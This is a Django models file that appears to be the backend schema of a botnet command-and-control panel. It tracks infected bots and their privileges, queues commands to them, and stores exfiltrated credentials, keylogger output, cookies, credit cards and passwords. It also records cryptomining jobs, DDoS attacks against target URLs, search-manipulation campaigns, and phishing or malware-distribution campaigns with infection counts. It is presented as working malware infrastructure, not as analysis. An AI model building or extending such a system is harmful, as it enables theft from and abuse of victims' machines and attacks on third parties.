from django.db import models
from django.utils import timezone
from cryptography.fernet import Fernet
from django.conf import settings

import uuid
import json

class Bot(models.Model):
    STATUS_CHOICES = [
        ('online', 'Online'),
        ('offline', 'Offline'),
        ('busy', 'Busy'),
    ]

    PLATFORM_CHOICES = [
        ('windows', 'Windows'),
        ('linux', 'Linux'),
        ('android', 'Android'),
        ('ios', 'iOS'),
        ('web', 'Web Browser'),
    ]

    BOT_TYPE_CHOICES = [
        ('python', 'Python Client'),
        ('web', 'Web Browser'),
        ('mobile', 'Mobile App'),
        ('binary', 'Compiled Binary'),
    ]

    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    bot_id = models.CharField(max_length=100, unique=True)
    bot_type = models.CharField(max_length=20, choices=BOT_TYPE_CHOICES, default='python')
    ip_address = models.GenericIPAddressField()
    hostname = models.CharField(max_length=255)
    platform = models.CharField(max_length=20, choices=PLATFORM_CHOICES)
    architecture = models.CharField(max_length=50)
    username = models.CharField(max_length=100)
    priveleges = models.CharField(max_length=50)
    status = models.CharField(max_length=10, choices=STATUS_CHOICES, default='online')
    last_seen = models.DateTimeField(auto_now=True)
    first_seen = models.DateTimeField(auto_now_add=True)

    #system info
    cpu_cores = models.PositiveIntegerField(default=1)
    memory_size = models.BigIntegerField(default=0)
    disk_space = models.BigIntegerField(default=0)

    #Network info
    internal_ip = models.GenericIPAddressField(null=True, blank=True)
    mac_address = models.CharField(max_length=17, blank=True)
    user_agent = models.TextField(blank=True)

    #jCapabilities
    can_mine = models.BooleanField(default=False)
    can_ddos = models.BooleanField(default=False)
    can_seo = models.BooleanField(default=False)
    can_collect_data = models.BooleanField(default=False)

    #Additional meta data
    metadata = models.JSONField(default=dict, blank=True)
    
    class Meta:
        indexes = [
            models.Index(fields=['status']),
            models.Index(fields=['platform']),
            models.Index(fields=['last_seen']),
            models.Index(fields=['bot_type']),
        ]
    
    def __str__(self):
        return f'{self.bot_id} ({self.platform})'

    def is_online(self):
        return (timezone.now() - self.last_seen).seconds < 300

class Command(models.Model):
    STATUS_CHOICES = [
        ('pending', 'Pending'),
        ('executing', 'Executing'),
        ('completed', 'Completed'),
        ('failed', 'Failed'),
        ('timeout', 'Timeout'),
    ]

    TYPE_CHOICES = [
        ('system', 'System'),
        ('network', 'Network'),
        ('data', 'Data'),
        ('special', 'Special'),
        ('seo', 'Seo'),
        ('mining', 'Mining'),
        ('ddos', 'DDoS'),
    ]

    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    bot = models.ForeignKey(Bot, on_delete=models.CASCADE, related_name='commands')
    command_type = models.CharField(max_length=20 ,choices=TYPE_CHOICES)
    command_name = models.CharField(max_length=100)
    parameters = models.JSONField(default=dict, blank=True)
    status = models.CharField(max_length=10,  choices= STATUS_CHOICES, default='pending')
    created_at = models.DateTimeField(auto_now_add=True)
    executed_at = models.DateTimeField(null=True, blank=True)
    completed_at = models.DateTimeField(null=True, blank=True)

    #command execution details
    output  = models.TextField(blank=True)
    error = models.TextField(blank=True)
    exit_code = models.IntegerField(null=True, blank=True)

    #encryption
    encrypted_output = models.BinaryField(null=True, blank=True)

    class Meta:
        ordering = ['-created_at']
        indexes = [
            models.Index(fields=['bot' ,'status']),
            models.Index(fields=['created_at']),
            models.Index(fields=['command_type']),
        ]
    
    def __str__(self):
        return f'{self.command_name} - {self.bot.bot_id}'

class ExfiltratedData(models.Model):
    DATA_TYPE_CHOICES = [
        ('file', 'File'),
        ('credentials', 'Credentials'),
        ('network', 'Network Info'),
        ('system', 'System'),
        ('browser', 'Browser Data'),
        ('keylogger', 'Keylogger Data'),
        ('cookies', 'Cookies'),
        ('credit_cards', 'Credit Cards'),
        ('passwords', 'Password'),
    ]

    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    bot = models.ForeignKey(Bot, on_delete=models.CASCADE, related_name='exfiltrated_data')
    data_type = models.CharField(max_length=20, choices=DATA_TYPE_CHOICES)
    filename = models.CharField(max_length=255, blank=True)
    description = models.TextField(blank=True)

    #Data storage
    raw_data = models.BinaryField(null=True, blank=True)
    encrypted_data = models.BinaryField()
    data_size = models.IntegerField(default=0)

    #Meta data 
    created_at = models.DateTimeField(auto_now_add=True)
    checksum = models.CharField(max_length=64, blank=True)

    class Meta:
        ordering = ['-created_at']
        indexes = [
            models.Index(fields=['bot', 'data_type']),
        ]
    
class MiningOperation(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    bot = models.ForeignKey(Bot, on_delete=models.CASCADE, related_name='mining_operations')
    algorithm = models.CharField(max_length=50, default='cryptonight')
    intensity = models.IntegerField(default=50)
    hashes_per_second = models.FloatField(default=0)
    start_time = models.DateTimeField(auto_now_add=True)
    end_time = models.DateTimeField(null=True, blank=True)
    is_active = models.BooleanField(default=True)

    class Meta:
        indexes = [
            models.Index(fields=['bot', 'is_active']),
        ]

class DDOSAttack(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    bot = models.ForeignKey(Bot, on_delete=models.CASCADE, related_name='ddos_attacks')
    target_url = models.URLField()
    duration = models.IntegerField(default=60)
    requests_sent = models.IntegerField(default=0)
    start_time = models.DateTimeField(auto_now_add=True)
    is_active = models.BooleanField(default=True)

    class Meta:
        indexes = [
            models.Index(fields=['bot', 'is_active']),
        ]

class SEOCampaign(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    name = models.CharField(max_length=100, unique=True)
    keyword = models.CharField(max_length=255)
    bots_assigned = models.IntegerField(default=0)
    searches_performed = models.IntegerField(default=0)
    start_time = models.DateTimeField(auto_now_add=True)
    end_time = models.DateTimeField(null=True, blank=True)
    is_active = models.BooleanField(default=True)

    class Meta:
        indexes = [
            models.Index(fields=['is_active']),
        ]

class DeliveryCampaign(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    name = models.CharField(max_length=100)
    delivery_method = models.CharField(
        max_length=50,
        choices=[
            ('web', 'Web Delivery'),
            ('email', 'Email Phishing'),
            ('social', 'Social Media'),
            ('malware', 'Malware Distribution'),
        ]
    )
    target_url = models.URLField(blank=True)
    payload_type = models.CharField(
        max_length=50,
        choices=[
            ('javascript', 'JavaScript Bot'),
            ('python', 'Python Script'),
            ('executable', 'Executable'),
            ('mobile', 'Mobile App'),
        ]   
    )
    infections = models.IntegerField(default=0)
    created_at = models.DateTimeField(auto_now_add=True)
    is_active = models.BooleanField(default=True)

    class Meta:
        indexes = [
            models.Index(fields=['is_active']),
        ]